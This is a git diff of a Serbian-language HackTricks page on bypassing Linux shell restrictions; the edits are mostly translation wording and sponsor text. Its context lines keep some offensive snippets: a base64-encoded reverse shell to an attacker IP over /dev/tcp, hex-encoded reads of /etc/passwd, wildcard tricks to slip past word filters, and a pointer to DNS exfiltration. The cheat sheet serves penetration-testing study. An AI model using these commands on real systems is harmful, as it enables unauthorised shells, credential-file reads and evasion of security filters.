@@ -14,10 +14,10 @@ Drugi načini podrške HackTricks-u:
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
-Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice.\
+Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
 Dobijte pristup danas:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -38,7 +38,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Zaobilazak putanja i zabranjenih reči
+### Zaobilaženje putanja i zabranjenih reči
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -145,7 +145,7 @@ cat `xxd -r -p <<< 2f6574632f706173737764`
 xxd -r -ps <(echo 2f6574632f706173737764)
 cat `xxd -r -ps <(echo 2f6574632f706173737764)`
 ```
-### Zaobiđi IP adrese
+### Zaobilazak IP adresa
 ```bash
 # Decimal IPs
 127.0.0.1 == 2130706433
@@ -161,7 +161,7 @@ echo ${PATH:0:1} #/
 ```
 ### DNS podaci eksfiltracija
 
-Mogli biste koristiti **burpcollab** ili [**pingb**](http://pingb.in) na primer.
+Možete koristiti **burpcollab** ili [**pingb**](http://pingb.in) na primer.
 
 ### Ugrađeni
 
@@ -315,9 +315,9 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Bypassovanje ograničenja za čitanje-samo/Noexec/Distroless
+## Bypassovanje ograničenja čitanja-samo/izvršavanja/nema izvršavanja u distroless okruženju
 
-Ako se nalazite unutar sistema datoteka sa **zaštitom za čitanje-samo i noexec** ili čak u distroless kontejneru, i dalje postoji način da **izvršite proizvoljne binarne datoteke, čak i shell!:**
+Ako se nalazite unutar sistema datoteka sa **zaštitom čitanja-samo i noexec** ili čak u distroless kontejneru, i dalje postoje načini da **izvršite proizvoljne binarne datoteke, čak i shell!:**
 
 {% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
 [bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
@@ -329,18 +329,18 @@ Ako se nalazite unutar sistema datoteka sa **zaštitom za čitanje-samo i noexec
 [escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
 {% endcontent-ref %}
 
-## Reference i Više
+## Reference i više
 
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 * [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 * [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
 * [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
-Dobijte pristup danas:
+Pristupite danas:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
@@ -350,7 +350,7 @@ Dobijte pristup danas:
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA ČLANSTVO**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
